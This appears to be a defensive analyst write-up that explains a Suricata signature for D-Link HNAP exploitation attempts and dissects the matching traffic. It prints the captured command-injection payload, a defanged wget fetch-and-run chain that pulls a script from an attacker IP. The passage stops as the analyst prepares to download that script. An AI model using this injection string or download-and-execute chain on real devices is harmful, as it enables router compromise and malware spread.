Breaking the initial vulnerability and exploit attempt down is beyond the scope of this project but I will give a brief overview. \n    - This website has some great analysis on this vulnerability:\n        - https://musteresel.github.io/posts/2018/03/exploit-hnap-security-flaw-dlink-dir-615.html\n\n### Suricata Alert\n\n- The Rule that fired was the following:\n ```\n\talert http $EXTERNAL_NET any -\u003e $HOME_NET any (msg:\u0022ET WEB_SERVER Possible D-Link Router HNAP Protocol Security Bypass Attempt\u0022; flow:established,to_server; urilen:7; http.method; content:\u0022POST\u0022; http.uri; content:\u0022/HNAP1/\u0022; nocase; endswith; fast_pattern; http.header; content:\u0022SOAPAction|3a 20|\u0022; nocase; content:\u0022/HNAP1/\u0022; distance:0; pcre:\u0022/^(?:set|get)/Ri\u0022; content:\u0022DeviceSettings\u0022; within:14; reference:url,www.securityfocus.com/bid/37690; reference:url,doc.emergingthreats.net/2010698; classtype:web-application-attack; sid:2010698; rev:6; metadata:created_at 2010_07_30, updated_at 2020_11_02;)\n```\n- Lets break this Suricata signature down.\n    1. The rule is an \u0022alert\u0022 rule looking at http traffic from any port inbound from the variable EXTERNAL_NET to the networks assigned to the variable HOME_NET on any port. This is followed by the message as denoted by \u0022msg\u0022 which basically tells us what the alert is firing for.\n    2.  The flow is set to established which means it will only match on established connections. Direction is \u0022to server.\u0022 \n    3. We see the \u0022urilen\u0022 which sets a uri length of 7 characters. \n    4. We then see a sticky buffer of \u0022http.method\u0022 which modifies the content \u0022POST\u0022 which come after it. That is telling the logic to look in the http.method field for content of \u0022POST.\u0022 If the http.method field has a GET or any method other then POST, the logic won\u0027t continue to run and the rule won\u0027t fire. \n    5. We then see another sticky buffer of \u0022http.uri.\u0022 Again, this is giving a field for which to look for the content that follows it. In this case its saying look in the \u0022http.uri\u0022 field for the content \u0022/HNAP1/\u0022. You will notice that their is 7 characters in \u0022/HNAP1/\u0022\n   6. We see \u0022nocase\u0022 which sounds exactly what it does - makes it not case sensitive.\n   7. Next is endswith, which according to the suricata manual it \u0022modifies the content to match exactly at the end of a buffer.\u0022\n   8.  \u0022fast pattern\u0022 is fairly complicated and takes some time to explain. I suggest consorting with the suricata manual if you are interested in what this does. \n   9. We then see \u0022http.header\u0022 sticky buffer which says \u0022 look at the http.header for the following content \u0022SOAPAction|3a 20|\u0022 \n      - notice the |3a 20| . If you put that in cyber chef and decode from hex to ASCII you will notice it translates to the character \u0022:\u0022 this is a special character and must be translate to hex in the rule or it will mess up the logic. This is trying to look for \u0022SOAPaction:\u0022\n   10. We see another content which again is modified by the preceding http.header sticky buffer. This content is looking for \u0022/HNAP1/.\n   11. \u0022distance: 0\u0022 is telling the logic to look for the preceding content of /HNAP1/ 0 bits away from the content before /HNAP1/ which in this case is SOAPaction:\n     - the Suricata manual has a great picture that explains this concept\n![image.png](/.attachments/image-532e61cd-c386-43e3-88e5-dcbf6874e550.png)\n    \n\n12.  We then see some pcre regex essentially looking for either \u0022set\u0022 or \u0022get\u0022 not dependent on case. \n```pcre:\u0022/^(?:set|get)/Ri\u0022```\n13. Right after the PCRE we see another content match looking for \u0022DeviceSettings\u0022 This is followed by a distance modifier of \u0022within: 14. This is best explained with another picture\n![image.png](/.attachments/image-c6c457e7-6c99-49f2-9ec6-97adf0a4f158.png)\n\n13. That\u0027s it for the logic of the rule. Following the logic we have some reference links, the classtype(which signifies which kind of attack it is),  Signature ID(SID), the revision number, and some metadata which tells us when it was created or modified. \n\n### The Traffic The Rule Fired For\n\n![image.png](/.attachments/image-e052bfb3-7be3-4d92-9713-607756a2e185.png)\n\n- As we can see we have a POST as the HTTP Method\n- We have /HNAP1/ as the URI\n- We have an HTTP header of SOAPaction: with  /HNAP1/ in the header.\n- Immediately following /HNAP1/ we have \u0022Get\u0022 which the regex will match on and then \u0022DeviceSettings\u0022\n- Following DeviceSettings we have the contents of the exploit payload which can change depending on what the threat actor is going to do. \n\n### The Initial Exploit\nDefanged!\n```\ncd \u0026\u0026 cd tmp \u0026\u0026 export PATH=$PATH:. \u0026\u0026 cd /tmp;wget http://23.94.22[.]13/a/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh`\u0022\n```\nThis looks like a rather simple command injection.\n- It does a CD (change directory) and if that executes with no errors it changes directory to the tmp directory.\n- Then adds the current path to the PATH variable\n- We see a CD to the /tmp directory where it then uses the wget tool to pull down a script titled \u0022wget.sh\u0022 from ```http://23[.]94.22[.]13/a/wget.sh```\n- It then changed the permissions on the wget.sh script to 777 or rwxrwxrwx \n- We then see it use sh to execute wget.sh and it follows it all up by deleting itself. \n\n\n### What\u0027s in wget.sh?\n\n- To find this out we need to fire up a VM (behind a VPN) and wget this wget.sh script from the attacker webserver. \n    - To that end we can just run the same command (defanged of course)\n    - Be careful from here on out.
